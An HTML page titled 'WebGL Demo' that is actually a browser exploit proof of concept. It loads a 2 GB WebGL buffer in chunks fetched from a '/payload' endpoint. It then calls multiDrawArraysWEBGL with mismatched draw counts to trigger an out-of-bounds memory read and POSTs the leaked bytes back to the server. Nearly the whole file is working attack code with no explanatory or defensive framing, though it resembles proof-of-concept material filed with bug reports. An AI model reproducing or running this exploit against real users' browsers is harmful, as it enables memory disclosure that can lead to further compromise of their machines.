<!doctype html>
<html lang="en">
    <head>
        <title>WebGL Demo</title>
        <meta charset="utf-8">
    </head>

    <body>
        <canvas id="glcanvas" width="1" height="1"></canvas>
    </body>

    <script id="vertex" type="x-shader/x-vertex">
        #extension GL_ANGLE_multi_draw : require
        attribute vec4 aVertexColor;
        varying highp vec4 vColor;
        void main() {
            gl_Position = vec4(0,0,0,0);
            gl_PointSize = 1.0;
            vColor = aVertexColor;
        }
    </script>

    <script id="fragment" type="x-shader/x-fragment">
        varying highp vec4 vColor;
        void main() {
            gl_FragColor = vColor;
        }
    </script>

    <script>
        function createShader(gl, type, source) {
            var shader = gl.createShader(type);
            gl.shaderSource(shader, source);
            gl.compileShader(shader);
            var success = gl.getShaderParameter(shader, gl.COMPILE_STATUS);
            if (success) {
                return shader;
            }

            console.log(gl.getShaderInfoLog(shader));
            gl.deleteShader(shader);
        }

        function createProgram(gl, vertexShader, fragmentShader) {
            var program = gl.createProgram();
            gl.attachShader(program, vertexShader);
            gl.attachShader(program, fragmentShader);
            gl.linkProgram(program);
            var success = gl.getProgramParameter(program, gl.LINK_STATUS);
            if (success) {
            return program;
            }

            console.log(gl.getProgramInfoLog(program));
            gl.deleteProgram(program);
        }

        const canvas = document.querySelector('#glcanvas');
        const gl = canvas.getContext('webgl2', {preserveDrawingBuffer: true});
        const ext = gl.getExtension('WEBGL_multi_draw');
        const regex = new RegExp('bytes (\\d+)-\\d+\\/\\d+', '');

        function stringToArrayBuffer(str) {
            let bufView = new Uint8Array(str.length);

            for (let i=0, strLen=str.length; i<strLen; i++) {
                bufView[i] = str.charCodeAt(i);
            }

            return bufView;
        }

        function convert(buff) {
            let view = new DataView(buff.buffer, 0);
            return view.getUint32(0, true);
        }

        function drawScene() {
            var vertexShaderSource = document.querySelector("#vertex").text;
            var fragmentShaderSource = document.querySelector("#fragment").text;
            var vertexShader = createShader(gl, gl.VERTEX_SHADER, vertexShaderSource);
            var fragmentShader = createShader(gl, gl.FRAGMENT_SHADER, fragmentShaderSource);
            var program = createProgram(gl, vertexShader, fragmentShader);

            var vertexColor = gl.getAttribLocation(program, "aVertexColor");
            var colorBuffer = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, colorBuffer);
            gl.bufferData(gl.ARRAY_BUFFER, 0x80000000, gl.STATIC_DRAW);

            console.log("Done create buffer");

            for (let i = 0; i < 1023; ++i) {
                let oReq = new XMLHttpRequest();
                oReq.open("GET", "/payload", false);
                let tmp_hdr = `bytes=${i * 0x200000}-${(i + 1) * 0x200000 - 1}`;
                oReq.setRequestHeader("Range", tmp_hdr);
                oReq.overrideMimeType("text/plain; charset=x-user-defined");
                oReq.send(null);

                let arrayBuffer = stringToArrayBuffer(oReq.response);
                let myHeader = oReq.getResponseHeader("Content-Range");
                let offset = regex.exec(myHeader);
                if (offset) {
                    let tmp_offset = parseInt(offset[1]);
                    gl.bufferSubData(gl.ARRAY_BUFFER, tmp_offset, arrayBuffer);
                }

            }

            console.log("Done create data");

            gl.clearColor(0, 0, 0, 0);
            gl.clear(gl.COLOR_BUFFER_BIT);
            gl.viewport(0, 0, 1, 1);
            gl.useProgram(program);
            gl.enableVertexAttribArray(vertexColor);
            gl.bindBuffer(gl.ARRAY_BUFFER, colorBuffer);
            gl.vertexAttribPointer(vertexColor, 4, gl.UNSIGNED_BYTE, true, 1, 0);

            var pixels = new Uint8Array(4);

            let firsts = new Array(1, 1, 1, 1, 1);
            let counts = new Int32Array([1, 1, 1, 1, 1]);
            ext.multiDrawArraysWEBGL(gl.POINTS, firsts, 2, counts, 0, firsts.length);

            gl.flush();
            gl.finish();

            gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
            let oPost = new XMLHttpRequest();
            oPost.open("POST", "/", false);
            let needle = convert(pixels);
            oPost.send(needle);
            console.log("Leaked: " + parseInt(oPost.response).toString(16));
        }

        drawScene();

    </script>
</html>
